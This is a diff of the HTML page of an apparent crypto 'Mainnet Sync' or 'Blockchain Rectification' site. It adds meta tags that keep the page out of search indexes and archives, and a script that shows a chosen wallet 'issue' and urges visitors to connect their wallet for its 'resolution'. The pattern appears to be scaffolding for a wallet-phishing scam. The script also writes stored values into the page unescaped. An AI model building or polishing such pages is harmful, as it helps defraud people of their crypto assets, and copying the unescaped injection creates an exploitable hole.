@@ -1,14 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
   
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-<head>
-    <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
-    />
+ <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index,follow">
+    <meta name="robots" content="noindex,follow">
+    <meta name="robots" content="index,nofollow">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp"/>
+    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp"/>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	 
     <!-- <title>Wallets | Linkup Affixs</title> -->
     <title>Home | Mainnet Sync app</title>
 
@@ -1554,6 +1559,44 @@
       setTimeout(() => {
         document.querySelector(".Loader").style.display = "none";
       }, 3000);
+    </script>
+
+    <script>
+
+      // Read the issue from sessionStorage
+document.addEventListener('DOMContentLoaded', function() {
+    const issueSlug = sessionStorage.getItem('selectedIssue') || 
+                     sessionStorage.getItem('redirectedIssue') || 
+                     'general';
+    
+    const issueName = sessionStorage.getItem('selectedIssueName') || 
+                     getIssueNameFromSlug(issueSlug);
+    
+    // Update page title and content
+    document.title = `${issueName} - Blockchain Rectification`;
+    
+    // Display the selected issue
+    const issueDisplay = document.createElement('div');
+    issueDisplay.className = 'selected-issue-display';
+    issueDisplay.innerHTML = `
+        <h2>Resolving: ${issueName}</h2>
+        <p>Please proceed with wallet connection for ${issueName.toLowerCase()} resolution.</p>
+    `;
+    
+    // Insert at the beginning of your content
+    const container = document.querySelector('.container') || document.body;
+    container.insertBefore(issueDisplay, container.firstChild);
+    
+    function getIssueNameFromSlug(slug) {
+        const issueMap = {
+            'deposit-withdrawal': 'Deposit / Withdrawal',
+            'assets-recovery': 'Assets Recovery',
+            // ... add all mappings
+        };
+        return issueMap[slug] || 'Wallet Issue';
+    }
+});
+
     </script>
   </body>
 
